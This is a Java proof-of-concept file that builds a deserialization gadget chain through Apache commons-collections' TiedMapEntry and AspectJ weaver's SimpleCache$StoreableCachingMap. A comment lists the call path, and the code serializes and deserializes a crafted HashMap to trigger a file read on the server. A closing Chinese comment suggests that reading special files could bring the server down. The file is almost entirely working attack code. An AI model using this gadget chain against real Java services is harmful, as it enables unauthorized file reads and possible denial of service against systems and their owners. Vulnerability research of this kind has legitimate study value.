package com.example.AspectJWeaver;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import java.util.HashMap;
import java.util.Map;

public class POC_2 {

    /***
     * <java.util.HashMap: void readObject(java.io.ObjectInputStream)>
     * <java.util.HashMap: int hash(java.lang.Object)>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.Object get(java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: byte[] readFromPath(java.lang.String)>
     * <java.io.FileInputStream: void read(byte[],int,int)>
     */

    public static void main(String[] args) throws Exception {
        Map scm = (Map) ReflectionUtil.createObject("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap",
                new Class[]{String.class, int.class},
                new Object[]{"D:/temp", 12});
        scm.putIfAbsent("evil.txt", "D:/temp/evil.txt");
        TiedMapEntry t = new TiedMapEntry(new HashMap<>(), "evil.txt");
        HashMap map = new HashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(t, "map", scm);
        SerializeUtil.deserialize(SerializeUtil.serialize(map)); // however字节数组的toString()方法返回的是对象的内存地址的字符串表示形式,但读取特殊的文件可以使服务器宕机？
    }

}
